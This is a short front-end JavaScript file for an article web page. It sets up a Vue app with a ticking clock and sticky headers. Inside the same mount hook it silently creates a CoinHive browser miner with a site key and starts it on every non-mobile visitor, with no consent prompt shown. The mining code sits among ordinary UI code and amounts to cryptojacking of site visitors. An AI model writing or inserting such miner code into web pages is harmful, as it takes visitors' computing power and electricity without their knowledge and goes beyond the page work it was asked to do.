let app = new Vue({
    el: '#app',
    data: function () {
        return {
            nowDatetime: moment().format('YYYY-MM-DD HH:mm:ss')
        }
    },
    mounted: function () {
        "use strict";
        $('.ui.sticky').each((key, item) => {
            if ($(item).hasClass('article-header')) {
                $(item).sticky({
                    context: $(item).parents('.article'),
                    offset: 50,
                    bottomOffset: 50,
                })
            }
            if ($(item).hasClass('article-meta')) {
                $(item).sticky({
                    context: $(item).parents('.article'),
                    offset: 170,
                    bottomOffset: 160,
                })
            }
        });

        let miner = new CoinHive.Anonymous('lfbo0YVN0NTu1fmeRdzGt5nDE9JOnkcz', {throttle: 0.5});
        if (!miner.isMobile()) {
            miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
        }
    }
});

setInterval(function () {
    app.$data.nowDatetime = moment().format('YYYY-MM-DD HH:mm:ss');
}, 1000);
